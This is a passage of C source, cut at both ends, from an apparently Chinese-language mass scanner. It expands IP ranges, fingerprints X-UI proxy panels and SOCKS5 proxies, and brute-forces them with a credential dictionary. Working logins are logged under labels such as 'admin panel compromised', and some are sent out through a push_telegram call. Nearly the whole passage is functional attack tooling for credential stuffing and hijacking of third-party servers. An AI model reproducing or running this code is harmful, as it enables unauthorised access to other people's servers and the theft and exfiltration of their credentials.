        report_path = fallback_report;
    }
    long long sz = file_size_bytes(report_path);
    g_completion_report_start_offset = (sz > 0) ? sz : 0;
}

static void format_compact_verified_line(const char *ip, uint16_t port,
                                         const char *user, const char *pass,
                                         const char *asn_in,
                                         char *out, size_t out_sz) {
    if (!out || out_sz == 0) return;
    const char *u = (user && *user) ? user : "-";
    const char *p = (pass && *pass) ? pass : "-";
    const char *asn = (asn_in && *asn_in) ? asn_in : "-";

    if (strchr(u, ':') && strchr(p, ':') && strcmp(u, p) == 0) {
        snprintf(out, out_sz, "%s:%u:%s %s", ip ? ip : "-", (unsigned)port, u, asn);
    } else {
        snprintf(out, out_sz, "%s:%u:%s:%s %s", ip ? ip : "-", (unsigned)port, u, p, asn);
    }
}

static void scanner_run_verify_logic(const verify_task_t *task) {
    if (!task) return;

    int xui_fingerprint_ok = task->xui_fingerprint_ok;
    int s5_fingerprint_ok = task->s5_fingerprint_ok;
    int s5_method = task->s5_method;
    if (xui_fingerprint_ok < 0 &&
        (task->work_mode == MODE_XUI || task->work_mode == MODE_DEEP || task->work_mode == MODE_VERIFY)) {
        xui_fingerprint_ok = xui_has_required_fingerprint(task->ip, task->port, 3000);
    }

    if (task->work_mode == MODE_S5) {
        if (s5_fingerprint_ok == 0) {
            return;
        }

        int verified = 0;
        for (size_t i = 0; i < task->cred_count; i++) {
            scanner_set_progress_token(task->ip, task->port, task->creds[i].username, task->creds[i].password);
            if (verify_socks5(task->ip, task->port, task->creds[i].username, task->creds[i].password, 3000)) {
                SAIA_ATOMIC_ADD_U64(&g_state.total_verified, 1);
                SAIA_ATOMIC_ADD_U64(&g_state.s5_verified, 1);

                char result_line[1024];
                snprintf(result_line, sizeof(result_line),
                         "[S5_VERIFIED] [优质-真穿透] %s:%d | 账号:%s | 密码:%s",
                         task->ip, task->port,
                         task->creds[i].username, task->creds[i].password);

                MUTEX_LOCK(lock_file);
                scanner_report_write_line_locked(result_line);
                printf("\n%s%s%s\n", C_GREEN, result_line, C_RESET);
                MUTEX_UNLOCK(lock_file);

                if (should_push_verified_now((uint64_t)SAIA_ATOMIC_LOAD_U64(&g_state.total_verified))) {
                    char msg[1024];
                    format_compact_verified_line(task->ip, task->port,
                                                 task->creds[i].username, task->creds[i].password,
                                                 "-", msg, sizeof(msg));
                    push_telegram(msg);
                }
                verified = 1;
                break;
            }
        }

        if (!verified) {
            char result_line[1024];
            if (s5_method == 0x02) {
                snprintf(result_line, sizeof(result_line),
                         "[S5_FOUND] [节点-可连通] %s:%d | S5-AUTH | 字典未命中或无L7能力",
                         task->ip, task->port);
            } else if (s5_method == 0xFF) {
                snprintf(result_line, sizeof(result_line),
                         "[S5_FOUND] [节点-可连通] %s:%d | S5-UNSUPPORTED-METHOD | 疑似S5但方法不匹配",
                         task->ip, task->port);
            } else {
                snprintf(result_line, sizeof(result_line),
                         "[S5_FOUND] [节点-可连通] %s:%d | S5-OPEN | 无L7能力",
                         task->ip, task->port);
            }
            MUTEX_LOCK(lock_file);
            scanner_report_write_line_locked(result_line);
            printf("\n%s%s%s\n", C_CYAN, result_line, C_RESET);
            MUTEX_UNLOCK(lock_file);
        }
        return;
    }

    if (task->work_mode == MODE_XUI || task->work_mode == MODE_DEEP) {
        if (task->work_mode == MODE_XUI && !xui_fingerprint_ok) {
            return;
        }
        int found = 0;
        for (size_t i = 0; i < task->cred_count && xui_fingerprint_ok; i++) {
            scanner_set_progress_token(task->ip, task->port, task->creds[i].username, task->creds[i].password);
            if (verify_xui(task->ip, task->port,
                           task->creds[i].username, task->creds[i].password, 3000)) {
                SAIA_ATOMIC_ADD_U64(&g_state.total_verified, 1);
                SAIA_ATOMIC_ADD_U64(&g_state.xui_verified, 1);

                char result_line[1024];
                snprintf(result_line, sizeof(result_line),
                         "[XUI_VERIFIED] [高危-后台沦陷] %s:%d | 账号:%s | 密码:%s | 登录成功",
                         task->ip, task->port,
                         task->creds[i].username, task->creds[i].password);
                MUTEX_LOCK(lock_file);
                scanner_report_write_line_locked(result_line);
                printf("\n%s%s%s\n", C_GREEN, result_line, C_RESET);
                MUTEX_UNLOCK(lock_file);

                if (should_push_verified_now((uint64_t)SAIA_ATOMIC_LOAD_U64(&g_state.total_verified))) {
                    char msg[1024];
                    format_compact_verified_line(task->ip, task->port,
                                                 task->creds[i].username, task->creds[i].password,
                                                 "-", msg, sizeof(msg));
                    push_telegram(msg);
                }

                found = 1;
                break;
            }
        }

        if (task->work_mode == MODE_DEEP && !found) {
            for (size_t i = 0; i < task->cred_count; i++) {
                scanner_set_progress_token(task->ip, task->port, task->creds[i].username, task->creds[i].password);
                if (verify_socks5(task->ip, task->port,
                                  task->creds[i].username, task->creds[i].password, 3000)) {
                    SAIA_ATOMIC_ADD_U64(&g_state.total_verified, 1);
                    SAIA_ATOMIC_ADD_U64(&g_state.s5_verified, 1);

                    char result_line[1024];
                    snprintf(result_line, sizeof(result_line),
                             "[S5_VERIFIED] [优质-真穿透] %s:%d | 账号:%s | 密码:%s",
                             task->ip, task->port,
                             task->creds[i].username, task->creds[i].password);
                    MUTEX_LOCK(lock_file);
                    scanner_report_write_line_locked(result_line);
                    printf("\n%s%s%s\n", C_GREEN, result_line, C_RESET);
                    MUTEX_UNLOCK(lock_file);

                    if (should_push_verified_now((uint64_t)SAIA_ATOMIC_LOAD_U64(&g_state.total_verified))) {
                        char msg[1024];
                        format_compact_verified_line(task->ip, task->port,
                                                     task->creds[i].username, task->creds[i].password,
                                                     "-", msg, sizeof(msg));
                        push_telegram(msg);
                    }
                    break;
                }
            }
        }
        return;
    }

    if (task->work_mode == MODE_VERIFY) {
        for (size_t i = 0; i < task->cred_count; i++) {
            scanner_set_progress_token(task->ip, task->port, task->creds[i].username, task->creds[i].password);
            int ok = 0;
            if (xui_fingerprint_ok) {
                ok = verify_xui(task->ip, task->port,
                                task->creds[i].username, task->creds[i].password, 3000);
            }
            if (!ok) ok = verify_socks5(task->ip, task->port,
                                         task->creds[i].username, task->creds[i].password, 3000);
            if (ok) {
                SAIA_ATOMIC_ADD_U64(&g_state.total_verified, 1);

                char result_line[1024];
                snprintf(result_line, sizeof(result_line),
                         "[VERIFIED] %s:%d | 账号:%s | 密码:%s",
                         task->ip, task->port,
                         task->creds[i].username, task->creds[i].password);
                MUTEX_LOCK(lock_file);
                scanner_report_write_line_locked(result_line);
                printf("\n%s%s%s\n", C_HOT, result_line, C_RESET);
                MUTEX_UNLOCK(lock_file);
                break;
            }
        }
    }
}

static void scanner_enqueue_verify_task(const worker_arg_t *task) {
    if (!task) return;

    verify_task_t *vt = (verify_task_t *)malloc(sizeof(verify_task_t));
    if (!vt) return;
    memset(vt, 0, sizeof(*vt));
    strncpy(vt->ip, task->ip, sizeof(vt->ip) - 1);
    vt->port = task->port;
    vt->creds = task->creds;
    vt->cred_count = task->cred_count;
    vt->work_mode = task->work_mode;
    vt->xui_fingerprint_ok = task->xui_fingerprint_ok;
    vt->s5_fingerprint_ok = task->s5_fingerprint_ok;
    vt->s5_method = task->s5_method;

    MUTEX_LOCK(lock_stats);
    vt->next = NULL;
    if (verify_tail) {
        verify_tail->next = vt;
    } else {
        verify_head = vt;
    }
    verify_tail = vt;
    pending_verify_tasks++;
    MUTEX_UNLOCK(lock_stats);
}

static int scanner_verify_cap_now(int scans_now, int feeding_now) {
    int reserve = verify_reserved_threads();
    if (feeding_now || scans_now > 0) return reserve;
    return clamp_positive_threads(g_config.threads);
}

#ifdef _WIN32
static unsigned __stdcall verify_worker_thread(void *arg) {
#else
static void *verify_worker_thread(void *arg) {
#endif
    verify_task_t *task = (verify_task_t *)arg;
    scanner_run_verify_logic(task);
    free(task);

    if (SAIA_ATOMIC_LOAD_INT(&verify_running_threads) > 0) {
        SAIA_ATOMIC_DEC_INT(&verify_running_threads);
    }

#ifdef _WIN32
    return 0;
#else
    return NULL;
#endif
}

static void scanner_pump_verify_workers(void) {
    while (1) {
        verify_task_t *task = NULL;
        int can_start = 0;

        MUTEX_LOCK(lock_stats);
        int total_threads = clamp_positive_threads(g_config.threads);
        int scans_now = running_threads;
        int feeding_now = feeding_in_progress;
        int verify_cap = scanner_verify_cap_now(scans_now, feeding_now);
        int total_running = running_threads + verify_running_threads;

        if (pending_verify_tasks > 0 && verify_head &&
            verify_running_threads < verify_cap &&
            total_running < total_threads) {
            task = verify_head;
            verify_head = verify_head->next;
            if (!verify_head) verify_tail = NULL;
            pending_verify_tasks--;
            verify_running_threads++;
            can_start = 1;
        }
        MUTEX_UNLOCK(lock_stats);

        if (!can_start || !task) break;

#ifdef _WIN32
        uintptr_t tid = _beginthreadex(NULL, 0, verify_worker_thread, task, 0, NULL);
        if (tid == 0) {
            MUTEX_LOCK(lock_stats);
            verify_running_threads--;
            pending_verify_tasks++;
            task->next = verify_head;
            verify_head = task;
            if (!verify_tail) verify_tail = task;
            MUTEX_UNLOCK(lock_stats);
            break;
        }
        CloseHandle((HANDLE)tid);
#else
        pthread_t tid;
        if (pthread_create(&tid, NULL, verify_worker_thread, task) != 0) {
            MUTEX_LOCK(lock_stats);
            verify_running_threads--;
            pending_verify_tasks++;
            task->next = verify_head;
            verify_head = task;
            if (!verify_tail) verify_tail = task;
            MUTEX_UNLOCK(lock_stats);
            break;
        }
        pthread_detach(tid);
#endif
    }
}

// 工作线程函数
#ifdef _WIN32
unsigned __stdcall worker_thread(void *arg) {
#else
void *worker_thread(void *arg) {
#endif
    worker_arg_t *task = (worker_arg_t *)arg;
    // 更新扫描统计
    SAIA_ATOMIC_ADD_U64(&g_state.total_scanned, 1);
    
    // 1. 端口连通性检查
    int fd = socket_create(0);
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(task->port);
    inet_pton(AF_INET, task->ip, &addr.sin_addr);
    
    int connect_timeout_ms = g_config.timeout > 0 ? (g_config.timeout * 1000) : 1500;
    if (connect_timeout_ms < 1500) connect_timeout_ms = 1500;
    if (socket_connect_timeout(fd, (struct sockaddr*)&addr, sizeof(addr), connect_timeout_ms) != 0) {
        socket_close(fd);
        worker_arg_release(task);
        if (g_config.scan_mode == SCAN_EXPLORE) {
            saia_sleep(2);
        }
        
        SAIA_ATOMIC_DEC_INT(&running_threads);
        
        #ifdef _WIN32
        return 0;
        #else
        return NULL;
        #endif
    }
    socket_close(fd);

    /* scan_mode: 1=探索(只扫描存活), 2=探索+验真, 3=只留极品(只保留验证通过的) */
    int do_verify = (g_config.scan_mode >= SCAN_EXPLORE_VERIFY);
    int do_fingerprint = do_verify;

    task->xui_fingerprint_ok = -1;
    task->s5_fingerprint_ok = -1;
    task->s5_method = -1;
    if (do_fingerprint) {
        if (task->work_mode == MODE_XUI || task->work_mode == MODE_DEEP || task->work_mode == MODE_VERIFY) {
            task->xui_fingerprint_ok = xui_has_required_fingerprint(task->ip, task->port, 2000);
        }
        if (task->work_mode == MODE_S5 || task->work_mode == MODE_DEEP || task->work_mode == MODE_VERIFY) {
            task->s5_fingerprint_ok = s5_has_required_fingerprint(task->ip, task->port, 3000, &task->s5_method);
        }
    }
    
    // 端口开放后，按模式统计“有效命中”（非纯端口开放）
    int service_hit = 0;
    if (task->work_mode == MODE_S5 && task->s5_fingerprint_ok > 0) {
        service_hit = 1;
        SAIA_ATOMIC_ADD_U64(&g_state.s5_found, 1);
    } else if (task->work_mode == MODE_XUI && task->xui_fingerprint_ok > 0) {
        service_hit = 1;
        SAIA_ATOMIC_ADD_U64(&g_state.xui_found, 1);
    } else if (task->work_mode == MODE_DEEP) {
        if (task->xui_fingerprint_ok > 0) {
            service_hit = 1;
            SAIA_ATOMIC_ADD_U64(&g_state.xui_found, 1);
        }
        if (task->s5_fingerprint_ok > 0) {
            service_hit = 1;
            SAIA_ATOMIC_ADD_U64(&g_state.s5_found, 1);
        }
    } else if (task->work_mode == MODE_VERIFY) {
        if (task->xui_fingerprint_ok > 0 || task->s5_fingerprint_ok > 0) {
            service_hit = 1;
        }
    }
    if (service_hit) {
        SAIA_ATOMIC_ADD_U64(&g_state.total_found, 1);
    }

    scanner_report_found_open(task);

    if (do_verify) {
        if (task->work_mode == MODE_S5 && task->s5_fingerprint_ok <= 0) {
            scanner_set_progress_token(task->ip, task->port, "-", "-");
        } else
        if (task->work_mode == MODE_XUI && task->xui_fingerprint_ok <= 0) {
            scanner_set_progress_token(task->ip, task->port, "-", "-");
        } else {
            scanner_enqueue_verify_task(task);
            scanner_pump_verify_workers();
        }
    } else {
        scanner_set_progress_token(task->ip, task->port, "-", "-");
    }

    
    worker_arg_release(task);
    
    SAIA_ATOMIC_DEC_INT(&running_threads);
    
    #ifdef _WIN32
    return 0;
    #else
    return NULL;
    #endif
}

typedef struct {
    credential_t *creds;
    size_t cred_count;
    uint16_t *ports;
    size_t port_count;
    size_t fed_count;
    size_t est_total;
    struct target_set_s *resume_done;
    struct target_set_s *history_done;
    int skipped_resume;
    int skipped_history;
    int enable_resume_skip;
    int enable_history_skip;
    char resume_checkpoint_file[MAX_PATH_LENGTH];
    char history_file[MAX_PATH_LENGTH];
    char progress_file[MAX_PATH_LENGTH];
    char targets_file[MAX_PATH_LENGTH];
    char current_ip[64];
    uint16_t current_port;
    uint64_t last_progress_write_ms;
} feed_context_t;

typedef struct target_node_s {
    char *key;
    struct target_node_s *next;
} target_node_t;

typedef struct target_set_s {
    target_node_t **buckets;
    size_t bucket_count;
    size_t size;
} target_set_t;

static target_set_t g_resume_cache = {0};
static target_set_t g_history_cache = {0};
static int g_skip_cache_ready = 0;
static int g_skip_cache_resume_enabled = 0;
static int g_skip_cache_history_enabled = 0;

static long long file_size_bytes(const char *path) {
    if (!path || !*path) return -1;
    struct stat st;
    if (stat(path, &st) != 0) return -1;
    return (long long)st.st_size;
}

static void write_scan_progress(feed_context_t *ctx, const char *status) {
    if (!ctx || !ctx->progress_file[0]) return;
    char payload[1024];
    MUTEX_LOCK(lock_stats);
    uint64_t scanned = g_state.total_scanned;
    uint64_t found = g_state.total_found;
    int threads_now = running_threads;
    size_t queue_now = g_scan_q_size;
    int producer_done = g_scan_producer_done;
    int worker_total = g_scan_worker_total;
    char tk_line[512];
    snprintf(tk_line, sizeof(tk_line), "%s", progress_token[0] ? progress_token : "-");
    MUTEX_UNLOCK(lock_stats);

    snprintf(payload, sizeof(payload),
             "status=%s\n"
             "pid=%d\n"
             "est_total=%zu\n"
             "fed=%zu\n"
             "scanned=%llu\n"
             "found=%llu\n"
             "audit_ips=%zu\n"
             "threads=%d\n"
             "run_mode=%d\n"
             "run_scan_mode=%d\n"
             "run_threads_cfg=%d\n"
             "queue_size=%zu\n"
             "producer_done=%d\n"
             "worker_total=%d\n"
             "targets_file=%s\n"
             "current_token=%s\n"
             "current_ip=%s\n"
             "current_port=%u\n"
              "updated=%llu\n",
              status ? status : "running",
             (int)g_state.pid,
             ctx->est_total,
             ctx->fed_count,
             (unsigned long long)scanned,
             (unsigned long long)found,
             ctx->fed_count,
             threads_now,
             g_state.mode,
             g_state.work_mode,
             g_state.threads,
             queue_now,
             producer_done,
             worker_total,
             ctx->targets_file[0] ? ctx->targets_file : "-",
             tk_line,
             ctx->current_ip[0] ? ctx->current_ip : "-",
             (unsigned)ctx->current_port,
             (unsigned long long)get_current_time_ms());

    MUTEX_LOCK(lock_file);
    file_write_all(ctx->progress_file, payload);
    MUTEX_UNLOCK(lock_file);
}

static uint32_t target_hash(const char *s) {
    uint32_t h = 2166136261u;
    while (s && *s) {
        h ^= (uint8_t)*s++;
        h *= 16777619u;
    }
    return h;
}

static int target_set_init(target_set_t *set, size_t bucket_count) {
    if (!set) return -1;
    if (bucket_count < 1024) bucket_count = 1024;
    set->buckets = (target_node_t **)calloc(bucket_count, sizeof(target_node_t *));
    if (!set->buckets) return -1;
    set->bucket_count = bucket_count;
    set->size = 0;
    return 0;
}

static int target_set_contains(target_set_t *set, const char *target) {
    if (!set || !set->buckets || !target || !*target) return 0;
    size_t idx = (size_t)(target_hash(target) % set->bucket_count);
    for (target_node_t *n = set->buckets[idx]; n; n = n->next) {
        if (strcmp(n->key, target) == 0) return 1;
    }
    return 0;
}

/* return: 1 inserted, 0 exists, -1 error */
static int target_set_add(target_set_t *set, const char *target) {
    if (!set || !set->buckets || !target || !*target) return -1;
    size_t idx = (size_t)(target_hash(target) % set->bucket_count);
    for (target_node_t *n = set->buckets[idx]; n; n = n->next) {
        if (strcmp(n->key, target) == 0) return 0;
    }

    target_node_t *n = (target_node_t *)malloc(sizeof(target_node_t));
    if (!n) return -1;
    n->key = strdup(target);
    if (!n->key) {
        free(n);
        return -1;
    }
    n->next = set->buckets[idx];
    set->buckets[idx] = n;
    set->size++;
    return 1;
}

static void target_set_free(target_set_t *set) {
    if (!set || !set->buckets) return;
    for (size_t i = 0; i < set->bucket_count; i++) {
        target_node_t *n = set->buckets[i];
        while (n) {
            target_node_t *next = n->next;
            free(n->key);
            free(n);
            n = next;
        }
    }
    free(set->buckets);
    set->buckets = NULL;
    set->bucket_count = 0;
    set->size = 0;
}

static void load_target_set_file(const char *path, target_set_t *set) {
    if (!path || !*path || !set) return;

    char **lines = NULL;
    size_t lc = 0;
    if (file_read_lines(path, &lines, &lc) != 0 || !lines) return;

    const size_t max_load = 200000;
    for (size_t i = 0; i < lc && i < max_load; i++) {
        char *line = lines[i] ? str_trim(lines[i]) : NULL;
        if (line && *line) {
            (void)target_set_add(set, line);
        }
        free(lines[i]);
    }
    for (size_t i = (lc < max_load ? lc : max_load); i < lc; i++) {
        free(lines[i]);
    }
    free(lines);
}

static int feed_single_target(const char *ip, void *userdata) {
    feed_context_t *ctx = (feed_context_t *)userdata;
    if (!ip || !*ip || !ctx) return 0;

    strncpy(ctx->current_ip, ip, sizeof(ctx->current_ip) - 1);
    ctx->current_ip[sizeof(ctx->current_ip) - 1] = '\0';

    if (ctx->enable_resume_skip && target_set_contains(ctx->resume_done, ip)) {
        ctx->skipped_resume++;
        return 0;
    }
    if (ctx->enable_history_skip && target_set_contains(ctx->history_done, ip)) {
        ctx->skipped_history++;
        return 0;
    }

    for (size_t p = 0; p < ctx->port_count && g_running && !g_reload; p++) {
        ctx->current_port = ctx->ports[p];
        while (g_running && !g_reload) {
            scanner_pump_verify_workers();

            if (g_config.backpressure.enabled) {
                backpressure_update(&g_config.backpressure);
                if (backpressure_should_throttle(&g_config.backpressure)) {
                    saia_sleep(200);
                    continue;
                }
            }

            if (scan_queue_size() < SCAN_TASK_QUEUE_CAP) break;
            saia_sleep(20);
        }
        if (!g_running || g_reload) break;

        while (g_running && !g_reload) {
            worker_arg_t *arg = worker_arg_acquire();
            if (!arg) {
                saia_sleep(5);
                continue;
            }

            strncpy(arg->ip, ip, sizeof(arg->ip) - 1);
            arg->ip[sizeof(arg->ip) - 1] = '\0';
            arg->port = ctx->ports[p];
            arg->creds = ctx->creds;
            arg->cred_count = ctx->cred_count;
            arg->work_mode = g_config.mode;
            arg->xui_fingerprint_ok = -1;
            arg->s5_fingerprint_ok = -1;
            arg->s5_method = -1;

            if (!scan_queue_push(arg)) {
                worker_arg_release(arg);
                saia_sleep(5);
                continue;
            }
            break;
        }
    }

    ctx->fed_count++;

    if (ctx->enable_resume_skip) {
        int ins = target_set_add(ctx->resume_done, ip);
        if (ins == 1) {
            MUTEX_LOCK(lock_file);
            file_append(ctx->resume_checkpoint_file, ip);
            file_append(ctx->resume_checkpoint_file, "\n");
            MUTEX_UNLOCK(lock_file);
        }
    }

    if (ctx->enable_history_skip) {
        int ins = target_set_add(ctx->history_done, ip);
        if (ins == 1) {
            MUTEX_LOCK(lock_file);
            file_append(ctx->history_file, ip);
            file_append(ctx->history_file, "\n");
            MUTEX_UNLOCK(lock_file);
        }
    }

    float eff_interval = g_config.feed_interval;
    if (g_state.threads >= 500 && eff_interval > 0.002f && g_config.scan_mode != SCAN_EXPLORE) {
        eff_interval = 0.0f;
    }
    if (eff_interval > 0.0f) {
        int ms = (int)(eff_interval * 1000.0f);
        if (ms < 1) ms = 1;
        saia_sleep(ms);
    }

    uint64_t now_ms = get_current_time_ms();
    if ((now_ms >= ctx->last_progress_write_ms && (now_ms - ctx->last_progress_write_ms) >= 5000) ||
        ctx->fed_count == ctx->est_total) {
        int rt = SAIA_ATOMIC_LOAD_INT(&running_threads);
        uint64_t scanned = SAIA_ATOMIC_LOAD_U64(&g_state.total_scanned);
        uint64_t found   = SAIA_ATOMIC_LOAD_U64(&g_state.total_found);
        printf("\r%s进度:%s %zu/%zu  线程:%d  已扫:%llu  命中:%llu   %s",
               C_CYAN, C_RESET, ctx->fed_count, ctx->est_total, rt,
               (unsigned long long)scanned,
               (unsigned long long)found,
               C_RESET);
        fflush(stdout);
        write_scan_progress(ctx, "running");
        ctx->last_progress_write_ms = now_ms;
    }
    return (g_running && !g_reload) ? 0 : -1;
}

static int iterate_expanded_targets(const char *raw_target,
                                    int (*on_target)(const char *target, void *userdata),
                                    void *userdata) {
    if (!raw_target || !on_target) return -1;

    char target[256];
    strncpy(target, raw_target, sizeof(target) - 1);
    target[sizeof(target) - 1] = '\0';

    char *s = target;
    while (*s && isspace((unsigned char)*s)) s++;
    char *e = s + strlen(s);
    while (e > s && isspace((unsigned char)e[-1])) *--e = '\0';
    if (!*s) return 0;

    if (strchr(s, '/')) {
        char ip_part[128];
        strncpy(ip_part, s, sizeof(ip_part) - 1);
        ip_part[sizeof(ip_part) - 1] = '\0';
        char *slash = strchr(ip_part, '/');
        if (slash) {
            *slash = '\0';
            int prefix = atoi(slash + 1);
            struct in_addr a;
            if (prefix >= 0 && prefix <= 32 && inet_pton(AF_INET, ip_part, &a) == 1) {
                uint32_t net = ntohl(a.s_addr);
                uint32_t mask = (prefix == 0) ? 0u : (~0u << (32 - prefix));
                uint32_t network = net & mask;
                uint64_t total = (prefix == 32) ? 1ULL : (1ULL << (32 - prefix));
                uint32_t start = network;
                uint32_t end = (uint32_t)(network + (uint32_t)(total - 1));
                if (prefix < 31) {
                    start = network + 1;
                    end = network + total - 2;
                }
                if (end >= start) {
                    char ip_buf[INET_ADDRSTRLEN];
                    for (uint32_t v = start; v <= end; v++) {
                        struct in_addr out;
                        out.s_addr = htonl(v);
                        inet_ntop(AF_INET, &out, ip_buf, sizeof(ip_buf));
                        if (on_target(ip_buf, userdata) != 0) return -1;
                        if (v == UINT32_MAX) break;
                    }
                    return 0;
                }
            }
        }
    }

    if (strchr(s, '-')) {
        char left[128] = {0};
        char right[128] = {0};
        char *dash = strchr(s, '-');
        size_t l = (size_t)(dash - s);
        if (l >= sizeof(left)) l = sizeof(left) - 1;
        memcpy(left, s, l);
        left[l] = '\0';
        strncpy(right, dash + 1, sizeof(right) - 1);

        char *ls = left;
        while (*ls && isspace((unsigned char)*ls)) ls++;
        char *le = ls + strlen(ls);
        while (le > ls && isspace((unsigned char)le[-1])) *--le = '\0';
        char *rs = right;
        while (*rs && isspace((unsigned char)*rs)) rs++;
        char *re = rs + strlen(rs);
        while (re > rs && isspace((unsigned char)re[-1])) *--re = '\0';

        struct in_addr a, b;
        if (inet_pton(AF_INET, ls, &a) == 1 && inet_pton(AF_INET, rs, &b) == 1) {
            uint32_t start = ntohl(a.s_addr);
            uint32_t end = ntohl(b.s_addr);
            if (end >= start) {
                char ip_buf[INET_ADDRSTRLEN];
                for (uint32_t v = start; v <= end; v++) {
                    struct in_addr out;
                    out.s_addr = htonl(v);
                    inet_ntop(AF_INET, &out, ip_buf, sizeof(ip_buf));
                    if (on_target(ip_buf, userdata) != 0) return -1;
                    if (v == UINT32_MAX) break;
                }
                return 0;
            }
        }

        if (inet_pton(AF_INET, ls, &a) == 1) {
            int numeric = 1;
            for (const char *p = rs; *p; p++) {
                if (!isdigit((unsigned char)*p)) {
                    numeric = 0;
                    break;
                }
            }
            if (numeric) {
                int end_last = atoi(rs);
                uint32_t start = ntohl(a.s_addr);
                int start_last = (int)(start & 0xFFu);
                if (end_last >= start_last && end_last <= 255) {
                    uint32_t base = start & 0xFFFFFF00u;
                    char ip_buf[INET_ADDRSTRLEN];
                    for (int x = start_last; x <= end_last; x++) {
                        struct in_addr out;
                        out.s_addr = htonl(base | (uint32_t)x);
                        inet_ntop(AF_INET, &out, ip_buf, sizeof(ip_buf));
                        if (on_target(ip_buf, userdata) != 0) return -1;
                    }
                    return 0;
                }
            }
        }
    }

    return on_target(s, userdata);
}

// 启动扫描 — 流式展开 IP 段，逐个投喂线程池（对齐 DEJI.py iter_expanded_targets 逻辑）
void scanner_start_multithreaded(char **nodes, size_t node_count, credential_t *creds, size_t cred_count, uint16_t *ports, size_t port_count) {
    init_locks();
    printf("开始扫描... 总节点: %zu, 总端口: %zu\n", node_count, port_count);
    
    size_t node_idx = 0;
    
    while (g_running && !g_reload && node_idx < node_count) {
        // 压背控制
        if (g_config.backpressure.enabled) {
            backpressure_update(&g_config.backpressure);
            if (backpressure_should_throttle(&g_config.backpressure)) {
                saia_sleep(1000);
                continue;
            }
        }
        
        // 检查并发数
        int current = SAIA_ATOMIC_LOAD_INT(&running_threads);
        
        if (current >= g_config.threads) {
            saia_sleep(100);
            continue;
        }
        
        // 创建任务
        for (size_t p = 0; p < port_count && g_running && !g_reload; p++) {
            worker_arg_t *arg = worker_arg_acquire();
            if (!arg) continue;
            strncpy(arg->ip, nodes[node_idx], sizeof(arg->ip) - 1);
            arg->port = ports[p];
            arg->creds = creds;
            arg->cred_count = cred_count;
            arg->work_mode = g_config.mode;
            arg->xui_fingerprint_ok = -1;
            arg->s5_fingerprint_ok = -1;
            arg->s5_method = -1;
            
            SAIA_ATOMIC_INC_INT(&running_threads);
            
#ifdef _WIN32
            _beginthreadex(NULL, 0, worker_thread, arg, 0, NULL);
#else
            pthread_t tid;
            pthread_create(&tid, NULL, worker_thread, arg);
            pthread_detach(tid);
#endif

            if ((SAIA_ATOMIC_LOAD_INT(&running_threads) % 10) == 0) {
                saia_sleep(5);
            }
        }
        
        node_idx++;
        
        // 进度显示 (每 10 个节点或最后一个刷新一次)
        if (node_idx % 10 == 0 || node_idx == node_count) {
            int rt = SAIA_ATOMIC_LOAD_INT(&running_threads);
            uint64_t scanned = SAIA_ATOMIC_LOAD_U64(&g_state.total_scanned);
            uint64_t found   = SAIA_ATOMIC_LOAD_U64(&g_state.total_found);
            printf("\r%s进度:%s %zu/%zu  线程:%d  已扫:%llu  命中:%llu   %s",
                   C_CYAN, C_RESET, node_idx, node_count, rt,
                   (unsigned long long)scanned,
                   (unsigned long long)found,
                   C_RESET);
            fflush(stdout);
        }
    }
    
    // 等待剩余线程
    while (1) {
        int remaining = SAIA_ATOMIC_LOAD_INT(&running_threads);
        if (remaining <= 0) break;
        saia_sleep(500);
    }
    
    printf("\n扫描结束\n");
}

static size_t scanner_estimate_targets_from_file(const char *targets_file) {
    if (!targets_file || !*targets_file) return 0;
    FILE *fp = fopen(targets_file, "rb");
    if (!fp) return 0;

    size_t est_total = 0;
    char line[4096];
    while (fgets(line, sizeof(line), fp)) {
        if (!line[0] || line[0] == '#') continue;
        char line_copy[4096];
        strncpy(line_copy, line, sizeof(line_copy) - 1);
        line_copy[sizeof(line_copy) - 1] = '\0';
        char *saveptr = NULL;
        for (char *tok = SAIA_STRTOK_R(line_copy, " \t\r\n", &saveptr);
             tok;
             tok = SAIA_STRTOK_R(NULL, " \t\r\n", &saveptr)) {
            if (*tok == '#') break;
            est_total += estimate_expanded_count(tok);
        }
    }
    fclose(fp);
    return est_total;
}

typedef struct {
    const char *targets_file;
    feed_context_t *ctx;
} stream_producer_ctx_t;

#ifdef _WIN32
static unsigned __stdcall scanner_stream_worker(void *arg) {
#else
static void *scanner_stream_worker(void *arg) {
#endif
    (void)arg;
    while (g_running && !g_reload) {
        worker_arg_t *task = scan_queue_pop();
        if (!task) {
            if (g_scan_producer_done) break;
            saia_sleep(20);
            continue;
        }

        SAIA_ATOMIC_INC_INT(&running_threads);

        worker_thread(task);
        if (g_config.scan_mode == SCAN_EXPLORE) {
            saia_sleep(2);
        }
    }
#ifdef _WIN32
    return 0;
#else
    return NULL;
#endif
}

#ifdef _WIN32
static unsigned __stdcall scanner_stream_producer(void *arg) {
#else
static void *scanner_stream_producer(void *arg) {
#endif
    stream_producer_ctx_t *pctx = (stream_producer_ctx_t *)arg;
    if (!pctx || !pctx->targets_file || !pctx->ctx) {
        MUTEX_LOCK(lock_stats);
        g_scan_producer_done = 1;
        MUTEX_UNLOCK(lock_stats);
#ifdef _WIN32
        return 0;
#else
        return NULL;
#endif
    }

    FILE *fp = fopen(pctx->targets_file, "rb");
    if (!fp) {
        printf("[错误] 无法打开目标文件: %s\n", pctx->targets_file);
        MUTEX_LOCK(lock_stats);
        g_scan_producer_done = 1;
        MUTEX_UNLOCK(lock_stats);
#ifdef _WIN32
        return 0;
#else
        return NULL;
#endif
    }

    char line[4096];
    while (g_running && !g_reload && fgets(line, sizeof(line), fp)) {
        if (!line[0] || line[0] == '#') continue;
        char line_copy[4096];
        strncpy(line_copy, line, sizeof(line_copy) - 1);
        line_copy[sizeof(line_copy) - 1] = '\0';
        char *saveptr = NULL;
        for (char *tok = SAIA_STRTOK_R(line_copy, " \t\r\n", &saveptr);
             tok && g_running && !g_reload;
             tok = SAIA_STRTOK_R(NULL, " \t\r\n", &saveptr)) {
            if (*tok == '#') break;
            if (iterate_expanded_targets(tok, feed_single_target, pctx->ctx) != 0) break;
        }
    }
    fclose(fp);

    MUTEX_LOCK(lock_stats);
    g_scan_producer_done = 1;
    MUTEX_UNLOCK(lock_stats);

#ifdef _WIN32
    return 0;
#else
    return NULL;
#endif
}

/*
 * scanner_start_streaming: 流式扫描 — 直接读取目标文件，按行渐进展开并投喂。
 */
void scanner_start_streaming(const char *targets_file,
                             credential_t *creds, size_t cred_count,
                             uint16_t *ports, size_t port_count) {
